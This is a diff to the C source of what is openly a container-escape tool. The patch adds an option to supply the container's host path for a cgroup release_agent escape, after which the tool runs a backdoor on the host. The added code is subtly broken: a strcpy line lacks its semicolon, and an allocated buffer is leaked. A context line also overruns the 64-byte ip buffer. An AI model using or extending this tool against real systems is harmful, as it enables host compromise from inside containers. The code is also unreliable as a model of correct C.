@@ -66,10 +66,12 @@ int main(int argc, char *argv[]) {
     attack_info.ip = (char *) malloc(64 * sizeof(char));
     attack_info.backdoor_path = (char *) malloc(512 * sizeof(char));
     attack_info.port = (char *) malloc(10 * sizeof(char));
+    attack_info.container_path = (char *) malloc(1024 * sizeof(char));
     memset(attack_info.command, 0x00, 512);
     memset(attack_info.ip, 0x00, 64);
     memset(attack_info.ip, 0x00, 512);
     memset(attack_info.port, 0x00, 10);
+    memset(attack_info.container_path, 0x00, 1024);
     const char *opt_type = "hvrduyp:m:c:I:P:B:";
     while ((opt = getopt_long_only(argc, argv, opt_type, opts, NULL)) != -1) {
         switch (opt) {
@@ -117,6 +119,9 @@ int main(int argc, char *argv[]) {
                 break;
             case 'y':
                 assumeyes = 1;
+                break;
+            case 'p':
+                attack_info.container_path = optarg;
                 break;
             default:
                 usage(argv[0]);
@@ -171,15 +176,20 @@ int main(int argc, char *argv[]) {
                 printf_wrapper(ERROR,
                                "Current process don't have CAP_SYS_ADMIN capability，can't escape by using release_agent\n");
             }
-            printf_wrapper(INFO, "Try to get container path in host\n");
-            char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
-            memset(container_path_in_host, 0x00, 1024);
-            get_container_path_in_host(container_path_in_host);
-            if (*container_path_in_host == 0x00) {
-                printf_wrapper(ERROR, "Get container path in host failed\n");
-                exit(EXIT_SUCCESS);
+            if (attack_info.container_path[0] == 0x00) {
+                printf_wrapper(INFO, "Try to get container path in host\n");
+                char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
+                memset(container_path_in_host, 0x00, 1024);
+                get_container_path_in_host(container_path_in_host);
+                if (*container_path_in_host == 0x00) {
+                    printf_wrapper(ERROR, "Get container path in host failed\n");
+                    exit(EXIT_SUCCESS);
+                }
+                strcpy(release_agent_attack_info.container_path_in_host, container_path_in_host);
+                free(container_path_in_host);
+            } else {
+                strcpy(release_agent_attack_info.container_path_in_host, attack_info.container_path)
             }
-            release_agent_attack_info.container_path_in_host = container_path_in_host;
             if (escape_by_release_agent() != 0) {
                 printf_wrapper(ERROR, "Escape by release_agent failed\n");
                 exit(EXIT_SUCCESS);
@@ -224,7 +234,6 @@ int main(int argc, char *argv[]) {
                     printf_wrapper(ERROR, "Run backdoor %s failed\n", attack_info.backdoor_path);
                 }
             }
-            free(container_path_in_host);
             break;
         }
         case DEVICE_ALLOW: {
